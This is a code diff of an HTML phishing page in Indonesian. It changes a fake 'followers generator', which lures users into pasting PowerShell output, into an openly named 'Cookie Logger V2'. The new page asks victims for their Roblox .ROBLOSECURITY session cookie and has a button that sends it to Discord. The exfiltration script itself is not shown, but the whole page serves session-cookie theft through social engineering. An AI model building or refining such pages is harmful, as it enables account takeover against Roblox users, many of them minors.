@@ -3,57 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie Collector</title>
+    <title>Cookie Logger V2 - Direct Send</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style type="text/tailwindcss">
-        @layer base {
-            body {
-                font-family: 'Inter', sans-serif;
-            }
-        }
-    </style>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
-<body class="bg-gradient-to-br from-gray-950 to-purple-950 text-gray-100 min-h-screen flex items-center justify-center p-4">
-    <div class="bg-gray-800 bg-opacity-90 backdrop-blur-sm p-8 md:p-10 rounded-xl shadow-2xl max-w-lg w-full transform hover:scale-105 transition-all duration-500 ease-in-out border border-purple-700">
-        <h1 class="text-4xl md:text-5xl font-extrabold text-center text-purple-400 mb-8 tracking-tight drop-shadow-lg animate-pulse">
-            TOOLS GENERATOR FOLLOWERS
-        </h1>
-
-        <!-- Bagian Video Tutorial (Cara Penggunaan) -->
-        <div class="mb-8 p-4 bg-gray-700 bg-opacity-70 rounded-lg border border-purple-600 shadow-lg">
-            <h2 class="text-2xl font-bold text-center text-purple-300 mb-4">
-                <i class="fab fa-youtube mr-2"></i> Video Tutorial
-            </h2>
-            <div class="relative w-full" style="padding-top: 56.25%;"> <!-- 16:9 Aspect Ratio -->
-                <iframe class="absolute top-0 left-0 w-full h-full rounded-md shadow-xl"
-                        src="https://www.youtube.com/embed/nDwl4V77A6s"
-                        title="YouTube video player"
-                        frameborder="0"
-                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
-                        allowfullscreen></iframe>
-            </div>
+<body class="bg-gradient-to-br from-gray-900 via-purple-900 to-violet-900 min-h-screen flex items-center justify-center p-4">
+    <div class="bg-gray-800 bg-opacity-90 backdrop-blur-lg p-8 rounded-2xl shadow-2xl w-full max-w-lg border border-gray-700">
+        <div class="text-center mb-8">
+            <h1 class="text-4xl font-bold text-white mb-2">Cookie Logger V2</h1>
+            <p class="text-gray-400">Paste cookie di bawah, langsung kirim!</p>
         </div>
-        <!-- Akhir Bagian Video Tutorial -->
 
-        <form id="cookie-form" class="space-y-6">
+        <form id="cookieForm" class="space-y-6">
             <div>
-                <label for="powershell" class="block text-lg font-medium text-gray-200 mb-2">
-                    MASUKAN FILE ROBLOX UNTUK FOLLOWERS:
-                </label>
-                <textarea id="powershell" name="powershell" rows="10"
-                          class="w-full p-4 bg-gray-700 border border-purple-600 rounded-lg focus:ring-purple-500 focus:border-purple-500 text-white resize-none transition-all duration-300 shadow-md outline-none"
-                          placeholder="Tempel output PowerShell Roblox Anda disini..."></textarea>
+                <label for="cookieInput" class="block text-sm font-medium text-gray-300 mb-2">.ROBLOSECURITY Cookie</label>
+                <textarea id="cookieInput" name="cookie" rows="6" required
+                    class="w-full px-4 py-3 bg-gray-700 bg-opacity-50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
+                    placeholder="Paste cookie .ROBLOSECURITY mu di sini..."></textarea>
             </div>
-            <button type="submit" id="submit-cookie"
-                    class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-6 rounded-lg transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 focus:ring-offset-gray-800 shadow-lg uppercase tracking-wider">
-                <i class="fas fa-paper-plane mr-2"></i> SEND FOLLOWERS
+            <button type="submit"
+                class="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white font-bold py-3 px-4 rounded-lg hover:from-purple-700 hover:to-pink-700 transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-opacity-50">
+                Kirim ke Discord
             </button>
         </form>
 
-        <div id="status" class="mt-8 text-center text-lg font-semibold text-gray-300 p-4 bg-gray-700 bg-opacity-70 rounded-lg border border-purple-600 shadow-inner opacity-0 transition-opacity duration-500 ease-out" style="min-height: 50px;">
-            <p>Menunggu input...</p>
+        <div id="status" class="mt-8 text-center text-lg font-semibold p-4 bg-gray-700 bg-opacity-70 rounded-lg border shadow-inner transition-opacity duration-500 ease-out opacity-0">
+            <!-- Status akan muncul di sini -->
         </div>
     </div>
 
